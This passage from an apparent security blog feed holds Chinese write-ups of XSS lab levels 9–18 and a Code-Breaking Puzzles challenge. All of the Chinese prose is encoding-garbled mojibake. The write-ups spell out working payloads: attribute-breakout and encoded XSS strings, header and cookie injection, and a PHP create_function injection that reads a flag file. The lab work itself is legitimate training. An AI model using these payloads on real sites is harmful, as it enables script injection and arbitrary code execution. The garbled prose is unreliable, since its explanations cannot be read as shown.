·è¯´ï¼Ÿåœ¨ä»£ç é‡Œé¢æ²¡å•¥å½±å“çš„éƒ¨åˆ†å°±æ˜¯æ³¨é‡Šäº†ï¼Œåœ¨æŸäº›æŒ–æ˜æ¼æ´çš„è¿‡ç¨‹ä¸­ä½¿ç”¨æ³¨é‡Šå¾€å¾€å¯ä»¥èµ·åˆ°æ„æƒ³ä¸åˆ°çš„æ•ˆæœï¼Œè¿™é‡Œå¯ä»¥åœ¨æ³¨é‡Šé‡Œé¢æ’å…¥å…³é”®å­—</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascri&amp;#x0070;t:alert(1)/*http://x.x.x.x*/</span><br></pre></td></tr></table></figure><p>å½“ç„¶å¦‚æœå•å•ä¸ºäº†å¼¹çª—ï¼Œè¿™æ ·ä¹Ÿè¡Œ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascri&amp;#x0070;t:alert(&quot;http://&quot;)</span><br></pre></td></tr></table></figure><h3 id="level-10"><a href="#level-10" class="headerlink" title="level-10"></a>level-10</h3><p>éšæ‰‹æµ‹è¯•äº†å¼¹çª—è¯­å¥ï¼Œå‘ç°è¢«è½¬ä¹‰äº†ï¼Œä½†æ˜¯å‘ç°äº†3ä¸ªéšè—å‚æ•°ï¼Œæœ‰ç‚¹è¹Šè··</p><p><img src="https://s2.ax1x.com/2019/03/07/kxRIZ4.png" alt="kxRIZ4.png"></p><p>æ¥åˆ†æä¸€ä¸‹æºä»£ç ï¼Œå‘ç°keywordå‚æ•°ç»è¿‡äº†<code>htmlspecialchars</code>å‡½æ•°çš„é˜²æŠ¤è€Œä¸”æ˜¯ä»¥åŒå¼•å·æ‹¼æ¥çš„ï¼Œæ‰€ä»¥è¿™é‡Œçš„åˆ©ç”¨ä»·å€¼å¾ˆä½ï¼Œä½†å‘ç°å¦å¤–ä¸€ä¸ªt_sortå‚æ•°ï¼Œä½†æ˜¯è¿™ä¸ªå‚æ•°ç»è¿‡äº†è¿‡äº†å°–æ‹¬å·çš„è¿‡æ»¤ï¼Œæœ€åè¾“å‡ºåˆ°å…¶ä¸­ä¸€ä¸ªéšè—çš„inputæ ‡ç­¾å†…</p><p><img src="https://s2.ax1x.com/2019/03/07/kxWSdH.png" alt="kxWSdH.png"></p><p>è™½ç„¶è¿‡æ»¤äº†å°–æ‹¬å·ï¼Œä½†å¯ä»¥é—­åˆåŒå¼•å·ï¼Œä½¿ç”¨<code>onclick</code>äº‹ä»¶ï¼Œç„¶åæŠŠéšè—çš„æ ‡ç­¾ç”¨<code>text</code>æ–¹å¼å›æ˜¾å‡ºæ¥å³å¯ï¼Œæœ€åçš„payload</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">t_sort=<span class="string">" onclick="</span>alert(<span class="number">123</span>)<span class="string">" type="</span>text<span class="string">" "</span><span class="string">"</span></span><br></pre></td></tr></table></figure><h3 id="level-11"><a href="#level-11" class="headerlink" title="level-11"></a>level-11</h3><p>åŒæ ·çš„æƒ…å†µæ˜æ˜¾çš„è¾“å‡ºç‚¹è¢«è½¬ä¹‰ï¼Œä½†æ˜¯å­˜åœ¨å‡ ä¸ªéšè—çš„inputæ ‡ç­¾ï¼ŒåŒæ ·çš„è§‚å¯Ÿä¸€ä¸‹ä»£ç ï¼Œå‘ç°åˆšæ‰åˆ©ç”¨çš„åœ°æ–¹å…¨éƒ½åŠ ä¸Šäº†é˜²æŠ¤ï¼Œä½†æ˜¯å¤šå‡ºçš„ä¸€ä¸ªæ ‡ç­¾å†…ç›´æ¥è¾“å‡º$str33ï¼Œå¾€å›æ‰¾è¿™ä¸ªå˜é‡æ¥è‡ªå“ªé‡Œï¼Œå‘ç°æ¥è‡ªhttpå¤´ï¼Œæ‰€ä»¥æ€è·¯å¾ˆæ˜ç¡®ï¼Œä¼ªé€ httpå¤´éƒ¨ä¿¡æ¯å³å¯ã€‚</p><p><img src="https://s2.ax1x.com/2019/03/07/kxWwf1.png" alt="kxWwf1.png"></p><p>æŠ“ä¸ªåŒ…ä¿®æ”¹é‡Œé¢çš„<code>HTTP_REFERER</code>å‚æ•°ï¼Œpayloadä¹Ÿæ˜¯åŸæ¥çš„payloadï¼Œå› ä¸ºè¿™é‡Œçš„è¾“å‡ºç‚¹çš„è¿‡æ»¤è·Ÿä¸Šä¸€å…³ä¸€æ ·ï¼Œä¹Ÿæ˜¯è¿‡æ»¤äº†å°–æ‹¬å·ï¼Œä½†æ— æ‰€è°“ç”¨åŒå¼•å·é—­åˆå³å¯</p><p><img src="https://s2.ax1x.com/2019/03/08/kz6bOe.png" alt="kz6bOe.png"></p><h3 id="level-12"><a href="#level-12" class="headerlink" title="level-12"></a>level-12</h3><p>åŒæ ·çš„ï¼Œè§‚å¯Ÿä»£ç ï¼Œå‘ç°è¿™é¢˜è·Ÿä¸Šé¢çš„é¢˜ç›®ç±»ä¼¼ï¼Œåˆ©ç”¨çš„è¾“å‡ºç‚¹åœ¨<code>$str33</code>è¿™ä¸ªå˜é‡ä¸Šï¼Œåªæ˜¯è¿™ä¸€æ¬¡ä¿®æ”¹çš„å¤´éƒ¨ä¿¡æ¯ä¸ä¸€æ ·äº†ï¼Œå¯ä»¥å‘ç°è¿™æ¬¡çš„å¤´éƒ¨ä¿¡æ¯æ˜¯<code>HTTP_USER_AGENT</code></p><p><img src="https://s2.ax1x.com/2019/03/08/kzgbad.png" alt="kzgbad.png"></p><p>ç±»ä¼¼çš„payloadï¼ŒæŠ“åŒ…å‘åŒ…å³å¯</p><p><img src="https://s2.ax1x.com/2019/03/08/kzRPOO.png" alt="kzRPOO.png"></p><h3 id="level-13"><a href="#level-13" class="headerlink" title="level-13"></a>level-13</h3><p>åˆ†æä¸€ä¸‹æºç ï¼Œå‘ç°è¿™ä¸€æ¬¡ä¸æ˜¯ä»httpå¤´ä¸‹åŠŸå¤«äº†ï¼Œè€Œæ˜¯ä»cookieè¿™ä¸€ç‚¹å…¥æ‰‹äº†ï¼Œå¯ä»¥çœ‹åˆ°ä»£ç é‡Œé¢é¦–å…ˆå¯¹cookieè¿›è¡Œä¸€ä¸ªåˆå§‹å€¼çš„è®¾ç½®ï¼Œç„¶åç»è¿‡äº†ä¸¤æ¬¡çš„è¿‡æ»¤ï¼Œæœ€åé€šè¿‡$str33è¿™ä¸ªå˜é‡è¾“å‡ºã€‚</p><p><img src="https://s2.ax1x.com/2019/03/08/kzfmsf.png" alt="kzfmsf.png"></p><p>å› ä¸ºè¿‡æ»¤å’Œè¾“å‡ºç‚¹æ²¡æœ‰ä»»ä½•å˜åŒ–ï¼Œæ‰€ä»¥åˆ©ç”¨æ–¹å¼è¿˜æ˜¯ä¸Šä¸€å…³çš„æ–¹å¼ï¼Œåªæ˜¯è¾“å…¥ç‚¹å˜äº†è€Œå·²ï¼Œè¿™æ¬¡ä»cookieä¸­çš„userå˜é‡è¿›è¡Œè¾“å…¥ï¼ŒåŒæ ·çš„payloadï¼š<code>&quot; onclick=&quot;alert(123)&quot;  type=&quot;text&quot; &quot;</code>ï¼ŒæŠ“åŒ…æ”¹åŒ…å³å¯</p><p><img src="https://s2.ax1x.com/2019/03/08/kzhC60.png" alt="kzhC60.png"></p><h3 id="level-14"><a href="#level-14" class="headerlink" title="level-14"></a>level-14</h3><p>è¿™ä¸€å…³åˆ©ç”¨äº†å›¾ç‰‡exifçš„å±æ€§ï¼Œç»è¿‡ä¸Šä¼ ä¹‹åå¯ä»¥åˆ©ç”¨é‡Œé¢çš„å±æ€§å»è§¦å‘xssæ¼æ´ï¼Œå¯æƒœæ²¡ç¯å¢ƒã€‚ç›´æ¥è·³åˆ°ä¸‹ä¸€å…³å§</p><h3 id="level-15"><a href="#level-15" class="headerlink" title="level-15"></a>level-15</h3><p>è§‚å¯Ÿæºç ï¼Œå¯ä»¥å‘ç°è¾“å‡ºç‚¹ç”¨å‡½æ•°åšäº†é˜²æŠ¤ï¼Œè€Œä¸”æ¯”èµ·å‰é¢å‡ å…³å¤šäº†å¾ˆå¤šä¸åŒç‚¹ã€‚</p><p><img src="https://s2.ax1x.com/2019/03/08/kz4u5Q.png" alt="kz4u5Q.png"></p><p>è¿™é‡ŒåŒ…å«äº†angular jsçš„è„šæœ¬ï¼Œå¹¶ä¸”ä½¿ç”¨äº†å®ƒçš„ç›¸å…³ç±»:<code>ng-include</code>ï¼Œç™¾åº¦å¯çŸ¥è¿™æ˜¯ä¸€ä¸ªæœ‰æ–‡ä»¶åŒ…å«åŠŸèƒ½çš„ç±»ã€‚</p><p><img src="https://s2.ax1x.com/2019/03/08/kz4jRs.png" alt="kz4jRs.png"></p><p>è¿™æ ·çš„è¯ï¼Œæ€è·¯å°±å‡ºæ¥äº†ï¼Œè¿™ä¸ªé¡µé¢æ²¡åˆ©ç”¨ç‚¹ï¼Œä½†æ˜¯åˆ©ç”¨å¦å¤–ä¸€ä¸ªå­˜åœ¨æ¼æ´çš„é¡µé¢ä¸å°±å¯ä»¥äº†å—ï¼Ÿå› ä¸ºè¿™é‡Œä½¿ç”¨äº†å‡½æ•°é˜²æŠ¤ï¼Œå‡ºç°å°–æ‹¬å·çš„ä¸œè¥¿å¾ˆæœ‰å¯èƒ½ä¼šè¢«è½¬ä¹‰ï¼Œè¿™é‡Œæˆ‘ä»¬é€‰æ‹©é€šè¿‡é—­åˆäº§ç”Ÿxssæ¼æ´çš„æ–‡ä»¶è¿›è¡ŒåŒ…å«ï¼Œé€‰æ‹©level-2ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">src=&apos;level2.php?keyword=&quot; onclick=&quot;alert(123)&quot; &quot;&apos;</span><br></pre></td></tr></table></figure><p>å¼¹çª—æˆåŠŸ</p><p><img src="https://s2.ax1x.com/2019/03/08/kzomVK.png" alt="kzomVK.png"></p><h3 id="level-16"><a href="#level-16" class="headerlink" title="level-16"></a>level-16</h3><p>æŸ¥çœ‹ç¬¬16å…³çš„ä»£ç ï¼Œå‘ç°è¾“å…¥çš„ä¸œè¥¿ç»è¿‡äº†å¤§å°å†™çš„è½¬æ¢å¹¶ä¸”é€šè¿‡å››æ¬¡çš„æ›¿æ¢æ£€æŸ¥ï¼Œåˆ†åˆ«å¯¹scriptï¼Œç©ºæ ¼ï¼Œ/ï¼Œè¿›è¡Œäº†æ›¿æ¢ï¼Œä½†æ˜¯æœ‰ä¸€ç‚¹å¾ˆé‡è¦ï¼Œå°–æ‹¬å·æ²¡æœ‰è¢«æ›¿æ¢ï¼Œè¿™ç»™æˆ‘ä»¬ç•™ä¸‹å¾ˆå¤§çš„åˆ©ç”¨ç©ºé—´ã€‚</p><p><img src="https://s2.ax1x.com/2019/03/08/kzoGrt.png" alt="kzoGrt.png"></p><p>å¦å¤–scriptè¢«æ›¿ä»£ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨imgæ ‡ç­¾ï¼Œå‰©ä¸‹æˆ‘ä»¬å°±éœ€è¦è€ƒè™‘å¦‚ä½•æŠŠç©ºæ ¼çš„å½±å“ç»™å»æ‰ï¼Œè¿™æ—¶å€™å°±éœ€è¦ä½¿ç”¨ç¼–ç æ¥è¿›è¡Œç»•è¿‡äº†ï¼Œå¯ä»¥é€‰æ‹©<code>%0d</code> <code>%0a</code> è¿›è¡Œç»•è¿‡ï¼Œæ„é€ å‡ºæœ€åçš„payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img%0dsrc=1%0donerror=&quot;alert(123)&quot;&gt;</span><br></pre></td></tr></table></figure><p>æˆåŠŸå¼¹çª—</p><p><img src="https://s2.ax1x.com/2019/03/08/kzoOiD.png" alt="kzoOiD.png"></p><h3 id="level-17"><a href="#level-17" class="headerlink" title="level-17"></a>level-17</h3><p>åˆ†æä¸€ä¸‹ä»£ç ï¼Œå‘ç°è¾“å‡ºç‚¹éƒ½è¿›è¡Œäº†é˜²æŠ¤ï¼Œå¯¹å°–æ‹¬å·ä»¥åŠåŒå¼•å·è¿›è¡Œäº†è½¬ä¹‰ï¼Œä½†æ˜¯ä¸å½±å“æˆ‘ä»¬åˆ©ç”¨ã€‚</p><p><img src="https://s2.ax1x.com/2019/03/08/kzbrfU.png" alt="kzbrfU.png"></p><p><code>&lt;embed&gt;</code>æ ‡ç­¾å®šä¹‰åµŒå…¥çš„å†…å®¹ï¼Œæ¯”å¦‚æ’ä»¶ï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨onäº‹ä»¶å»è¿›è¡Œè§¦å‘ï¼Œä½†æ˜¯é¦–å…ˆå¾—ç”¨bå»é—­åˆå‰é¢çš„ç­‰å·ï¼Œæ„é€ payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arg02=b onclick=alert(1)</span><br></pre></td></tr></table></figure><p>æˆåŠŸå¼¹çª—</p><p><img src="https://s2.ax1x.com/2019/03/08/kzq64f.png" alt="kzq64f.png"></p><p>æŸ¥çœ‹è¾“å‡ºéªŒè¯ä¸€ä¸‹æ€è·¯</p><p><img src="https://s2.ax1x.com/2019/03/08/kzqBDA.png" alt="kzqBDA.png"></p><h3 id="level-18"><a href="#level-18" class="headerlink" title="level-18"></a>level-18</h3><p>è·Ÿä¸Šé¢é‚£ä¸€ä¸ªé¢˜ç›®æ²¡æœ‰å•¥åŒºåˆ«ï¼Œä¸€æ ·çš„æ“ä½œã€‚ã€‚</p><p>payloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/xss/level18.php?arg01=a&amp;arg02=b%20onmouseout=alert(1)</span><br></pre></td></tr></table></figure><p>ç›´æ¥å¼¹çª—</p><p><img src="https://s2.ax1x.com/2019/03/08/kzLZqA.png" alt="kzLZqA.png"></p><p>çœ‹çœ‹è¾“å‡ºï¼Œè·Ÿä¸Šä¸€å…³å·®ä¸å¤š</p><p><img src="https://s2.ax1x.com/2019/03/08/kzLGrj.png" alt="kzLGrj.png"></p><p>ä¸Šé¢çš„æ¸¸æˆéƒ½æ˜¯ç›´æ¥çœ‹æºä»£ç æ‰å‘è§‰åˆ°å“ªé‡Œæœ‰æ¼æ´ï¼Œé‚£ä¹ˆè‚¯å®šé—®é¢˜æ¥äº†ï¼Œå¦‚æœä¸ç»™æºç çš„æƒ…å†µä¸‹è¯¥æ€æ ·å»æµ‹è¯•å‘¢ï¼Ÿå› ä¸ºåœ¨ç°å®æ¸—é€ä¸­æˆ‘ä»¬éœ€è¦ä¸€ä¸ªä¸ªpayloadæµ‹è¯•æ˜¯å¾ˆéº»çƒ¦çš„</p><p>è¿™é‡Œæˆ‘æä¾›ä¸€ç§æ¯”è¾ƒå¤§ä¼—ä¸€ç‚¹çš„fuzzæŠ€å·§ã€‚åˆ©ç”¨burpsuitè‡ªåŠ¨åŒ–xss</p><p>é¦–å…ˆæˆ‘ä»¬å¾—åœ¨burpsuitçš„Extenderæ¨¡å—ä¸­ä¸‹è½½å¯¹åº”çš„<code>XSS Validator</code>æ’ä»¶</p><p><img src="https://s2.ax1x.com/2019/03/08/kzjkxU.png" alt="kzjkxU.png"></p><p>å®‰è£…æˆåŠŸåå¯ä»¥å‘ç°èœå•æ ä¸Šä¼šå¤šä¸€æ ä½ æ’ä»¶çš„åå­—</p><p><img src="https://s2.ax1x.com/2019/03/08/kzORmj.png" alt="kzORmj.png"></p><p>è¿™é‡Œæˆ‘ä»¬è¿˜éœ€è¦å¦å¤–ä¸€ä¸ªä¸œè¥¿å«<code>PhantomJs</code>ï¼Œè¿™æ˜¯ä¸‹è½½åœ°å€ï¼š<a href="http://phantomjs.org/download.htmlï¼Œå¦å¤–æˆ‘ä»¬éœ€è¦åœ¨xssValidatorçš„githubä¸Šä¸‹è½½ä¸€ä¸ªå°è„šæœ¬" target="_blank" rel="noopener">http://phantomjs.org/download.htmlï¼Œå¦å¤–æˆ‘ä»¬éœ€è¦åœ¨xssValidatorçš„githubä¸Šä¸‹è½½ä¸€ä¸ªå°è„šæœ¬</a></p><p><img src="https://s2.ax1x.com/2019/03/08/kzXKgS.png" alt="kzXKgS.png"></p><p>ç„¶åæŠŠå®ƒæ”¾åœ¨è·Ÿ<code>Phantomjs</code>åŒä¸€çº§ç›®å½•ä¸‹å³å¯ï¼Œç„¶ååˆ©ç”¨<code>Phantomjs</code>æ‰“å¼€å³å¯ï¼Œæ­¤æ—¶å¼€å§‹ç›‘å¬</p><p><img src="https://s2.ax1x.com/2019/03/08/kzXjKg.png" alt="kzXjKg.png"></p><p>è¿™é‡Œæˆ‘ä»¥å°æ¸¸æˆç¬¬ä¸€å…³ä¸ºä¾‹ï¼Œç°åœ¨å°±å¯ä»¥ä½¿ç”¨bpæŠ“åŒ…å‘é€è‡³çˆ†ç ´æ¨¡å—ï¼Œç„¶åé€‰æ‹©æ’ä»¶æ¨¡å¼ï¼Œé€‰æ‹©æˆ‘ä»¬çš„æ’ä»¶</p><p><img src="https://s2.ax1x.com/2019/03/08/kzjQG6.png" alt="kzjQG6.png"></p><p>ç„¶åå»åˆ°è¯¥æ’ä»¶çš„é¡µé¢å¤åˆ¶å®ƒçš„ç‰¹å¾ç ï¼ŒåŠ è½½è¿›å»å­—å…¸ä¸­</p><p><img src="https://s2.ax1x.com/2019/03/08/kzjUII.png" alt="kzjUII.png"></p><p><img src="https://s2.ax1x.com/2019/03/08/kzjxSK.png" alt="kzjxSK.png"></p><p>ç‚¹å‡»attackï¼Œæ”»å‡»æˆåŠŸçš„è¯ä¼šæ˜¾ç¤ºï¼ŒåŒæ—¶ç›‘å¬ä¹Ÿä¼šå‡ºç°æŠ¥æ–‡çš„å›æ˜¾</p><p><img src="https://s2.ax1x.com/2019/03/08/kzvkFI.png" alt="kzvkFI.png"></p><p><img src="https://s2.ax1x.com/2019/03/08/kzvZSf.png" alt="kzvZSf.png"></p><p>è¿™æ ·å»æµ‹è¯•å°±æ¯”å¹³å¸¸æ‰‹å·¥æµ‹è¯•è¦ä¾¿æ·å¤šäº†ã€‚</p>]]></content>
      
      <categories>
          
          <category> xss </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Code-Breaking-Puzzleså­¦ä¹ </title>
      <link href="/Code-Breaking-Puzzles-Learning.html"/>
      <url>/Code-Breaking-Puzzles-Learning.html</url>
      <content type="html"><![CDATA[<p>è¿™æ³¢åˆ·é¢˜ä¸»è¦ä»¥å­¦ä¹ ä¸ºä¸»ï¼Œå¤ç°ä¸ºä¸»ï¼ŒçŸ¥è¯†ç‚¹çœŸçš„å¤ªæ£’äº†<a id="more"></a>23333</p><h3 id="easy-function"><a href="#easy-function" class="headerlink" title="easy - function"></a>easy - function</h3><p>è¿™ä¸ªé¢˜ç›®çš„ç‚¹å¾ˆæœ‰æ„æ€æ˜¯å…³äº<code>create_function</code>è¿™ä¸ªå‡½æ•°çš„</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$action = $_GET[<span class="string">'action'</span>] ?? <span class="string">''</span>;</span><br><span class="line">$arg = $_GET[<span class="string">'arg'</span>] ?? <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/^[a-z0-9_]*$/isD'</span>, $action)) &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $action(<span class="string">''</span>, $arg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆç†è§£ä¸€ä¸‹ä»£ç å°±æ˜¯å…ˆå¾—ç»•è¿‡ä¸€ä¸ªæ­£åˆ™ï¼Œè¿™ä¸ªæ­£åˆ™åªæœ‰æ»¡è¶³ä¸æ˜¯å­—æ¯æ•°å­—ä»¥åŠä¸‹åˆ’çº¿æ‰èƒ½ç»•è¿‡ï¼Œæ‰å­˜åœ¨ä¸€ä¸ªå¯æ§å‚æ•°çš„å‡½æ•°è°ƒç”¨ï¼Œä½†æ˜¯æƒ³ä¸åˆ°æ€ä¹ˆç»•è¿‡çš„è¯ï¼Œå¯ä»¥ç”¨<code>var_dump</code>å‡½æ•°å°è¯•fuzzä¸€ä¸‹ï¼Œå¯ä»¥å¾—åˆ°<code>\</code>è¿™ä¸ªç¬¦å·æ˜¯å¯ä»¥ç»•è¿‡çš„</p><p><img src="https://s2.ax1x.com/2019/02/25/kIZ0GF.png" alt="kIZ0GF.png"></p><p>ä¸ºä»€ä¹ˆå¯ä»¥ç»•è¿‡ï¼Œpç¥åœ¨å°å¯†åœˆä¸­æœ‰è¯´è¿‡</p><p><img src="https://s2.ax1x.com/2019/02/25/kIZa5T.png" alt="kIZa5T.png"></p><p>ä¹Ÿå°±æ˜¯ä¸€ä¸ªå‘½åç©ºé—´çš„é—®é¢˜ï¼Œä»€ä¹ˆæ˜¯å‘½åç©ºé—´ï¼Ÿå¯ä»¥äº†è§£ä¸€ä¸‹<a href="http://php.net/manual/zh/language.namespaces.definition.php" target="_blank" rel="noopener">http://php.net/manual/zh/language.namespaces.definition.php</a></p><p>ä½†æ˜¯æ¥ä¸‹æ¥éœ€è¦ä¸€ä¸ªå±é™©å‡½æ•°ï¼Œç”±äºPHP7çš„ç‰ˆæœ¬å¯¹äºå±é™©å‡½æ•°åšäº†å¾ˆå¤šé™åˆ¶ï¼Œä½†è¿˜æ˜¯å¯ä»¥ä½¿ç”¨<code>create_function</code>è¿™ä¸ªå‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯æ–°æ„å»ºå‡½æ•°çš„å‚æ•°ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯ä»£ç å†…å®¹ï¼Œè¿™ä¸ªå‡½æ•°çš„åˆ©ç”¨ç‚¹åœ¨å“ªï¼Ÿå¯ä»¥çœ‹ä¸€ä¸‹è¿™ç¯‡æ–‡ç« <a href="https://blog.51cto.com/lovexm/1743442ï¼Œæœ¬è´¨å°±æ˜¯å°†ç¬¬ä¸€ä¸ªå‚æ•°ä»¥åŠç¬¬äºŒä¸ªå‚æ•°åˆ†åˆ«åˆå¹¶è€Œå·²ï¼Œå¯ä»¥è‡ªå·±å»çœ‹ä¸€ä¸‹åº•å±‚çš„ä»£ç ï¼Œå°±æ˜¯é—­åˆä¸‹é¢è¿™å¥å‡½æ•°" target="_blank" rel="noopener">https://blog.51cto.com/lovexm/1743442ï¼Œæœ¬è´¨å°±æ˜¯å°†ç¬¬ä¸€ä¸ªå‚æ•°ä»¥åŠç¬¬äºŒä¸ªå‚æ•°åˆ†åˆ«åˆå¹¶è€Œå·²ï¼Œå¯ä»¥è‡ªå·±å»çœ‹ä¸€ä¸‹åº•å±‚çš„ä»£ç ï¼Œå°±æ˜¯é—­åˆä¸‹é¢è¿™å¥å‡½æ•°</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">function __lambda_func ( function_args ) &#123; function_code &#125; \<span class="number">0</span></span><br></pre></td></tr></table></figure><p>æ‰€ä»¥å¯¹äºä¸¤ä¸ªå‚æ•°å°±æœ‰ä¸¤ç§é—­åˆæ–¹å¼</p><ol><li>å¦‚æœå¯æ§åœ¨ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œéœ€è¦é—­åˆåœ†æ‹¬å·å’Œå¤§æ‹¬å·ï¼š<code>create_function(&#39;){}phpinfo();//&#39;, &#39;&#39;);</code></li><li>å¦‚æœå¯æ§åœ¨ç¬¬äºŒä¸ªå‚æ•°ï¼Œéœ€è¦é—­åˆå¤§æ‹¬å·ï¼š<code>create_function(&#39;&#39;, &#39;}phpinfo();//&#39;);</code></li></ol><p>çªç„¶è§‰å¾—å­—ç¬¦ä¸²æ‹¼æ¥æå…¶ä¸å®‰å…¨ã€‚ã€‚ã€‚åªè¦ä¸€é—­åˆå°±å¯ä»¥åˆ›é€ ç‚¹å¥‡å¥‡æ€ªæ€ªçš„ä¸œè¥¿ï¼Œå› ä¸ºè¿™é‡Œé¢æ˜¯php7ï¼Œå±é™©å‡½æ•°ä¸èƒ½ç”¨äº†ï¼Œå¦‚æœæ‹¿åˆ°çš„æ˜¯webshellï¼Œä¹Ÿå¯ä»¥ç”¨phpçš„scandirã€globç­‰å‡½æ•°æ¥éå†ç›®å½•æ¥æ‰¾flagã€‚</p><p>æœ€åå¯ä»¥æ„é€ payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">action=\create_function&amp;arg=&#125;var_dump(scandir(%27../%27));//</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">action=\create_function&amp;arg=&#125;var_dump(file_get_contents(&apos;../flag_h0w2execute_arb1trary_c0de&apos;));//</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/02/25/kImOgg.png" alt="kImOgg.png"></p><h3 id="easy-pcrewaf"><a href="#easy-pcrewaf" class="headerlink" title="easy-pcrewaf"></a>easy-pcrewaf</h3><p>è¿™ä¸ªé¢˜ç›®æ˜¯æœ‰å…³æ­£åˆ™çš„ä¸€ä¸ªç»•è¿‡ï¼Œè¯¦ç»†çš„åŸç†å¯ä»¥çœ‹çœ‹pç¥çš„è¿™ç¯‡æ–‡ç« :<a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.htmlã€‚" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.htmlã€‚</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_php</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_match(<span class="string">'/&lt;\?.*[(`;?&gt;].*/is'</span>, $data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($_FILES)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(show_source(<span class="keyword">__FILE__</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$user_dir = <span class="string">'data/'</span> . md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">$data = file_get_contents($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>]);</span><br><span class="line"><span class="keyword">if</span> (is_php($data)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"bad request"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    @mkdir($user_dir, <span class="number">0755</span>);</span><br><span class="line">    $path = $user_dir . <span class="string">'/'</span> . random_int(<span class="number">0</span>, <span class="number">10</span>) . <span class="string">'.php'</span>;</span><br><span class="line">    move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>], $path);</span><br><span class="line"></span><br><span class="line">    header(<span class="string">"Location: $path"</span>, <span class="keyword">true</span>, <span class="number">303</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯¹äºè¿™ä¸ªæ­£åˆ™ï¼Œå°±æ˜¯ä¸ºè®©PHPä»£ç ä¸èƒ½å¤Ÿå®ç°é—­åˆï¼Œä¹Ÿå°±æ˜¯æœ€åä¸èƒ½å‡ºç°(`;?&gt;è¿™å‡ ä¸ªç¬¦å·ï¼Œé‚£æ€ä¹ˆç»•è¿‡ï¼Ÿpç¥ç»™å‡ºäº†è¿™æ ·çš„è§£é‡Šï¼Œç”±äºæ­£åˆ™æœ‰ä¸¤ç§åŒ¹é…æ¨¡å¼</p><blockquote><ul><li>DFA: ä»èµ·å§‹çŠ¶æ€å¼€å§‹ï¼Œä¸€ä¸ªå­—ç¬¦ä¸€ä¸ªå­—ç¬¦åœ°è¯»å–è¾“å…¥ä¸²ï¼Œå¹¶æ 